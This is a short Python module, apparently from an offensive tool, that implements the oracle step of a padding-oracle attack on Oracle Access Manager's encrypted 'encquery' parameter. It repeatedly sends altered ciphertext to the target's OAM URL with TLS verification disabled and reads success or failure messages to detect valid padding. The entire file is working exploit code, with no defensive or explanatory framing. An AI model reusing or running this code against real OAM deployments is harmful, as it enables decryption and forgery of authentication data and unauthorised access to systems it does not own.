import sys

import urllib

from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode
from urllib import quote
import requests
import socket
import time
import logging
from lib.constants import Constants


class PadBuster(PaddingOracle):
    def __init__(self, prefix_message, padding_success_msg, padding_fail_msg, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self._padding_success_msg = padding_success_msg
        self._padding_fail_msg = padding_fail_msg
        self._prefix_message = prefix_message
        self.wait = kwargs.get('wait', 2.0)
        self._logger = logging.getLogger(Constants.LOGGER_NAME)

    def oracle(self, data, **kwargs):
        request_sent = False
        while not request_sent:
            try:
                msg = self._prefix_message.encquery + data
                encoded_msg = b64encode(msg)
                url = self._prefix_message.oam_url + "?encquery=" + urllib.quote(
                    encoded_msg + '  ' + self._prefix_message.extra_params)
                response = requests.get(url, stream=False, timeout=15, verify=False, allow_redirects=False)
                request_sent = True

            except (socket.error, requests.exceptions.RequestException):
                self._logger.exception('Retrying request in %.2f seconds...',
                                       self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)
        content = response.text

        # TODO move to a helper function
        if self._padding_success_msg in content:
            self._logger.debug('No padding exception raised on %r', quote(b64encode(data)))
            return
        elif self._padding_fail_msg in content:
            raise BadPaddingException
        else:
            self._logger.error("Unexpected reply from OAM. Please examine response")
            self._logger.debug("Response: %s", content)
            sys.exit(-1)
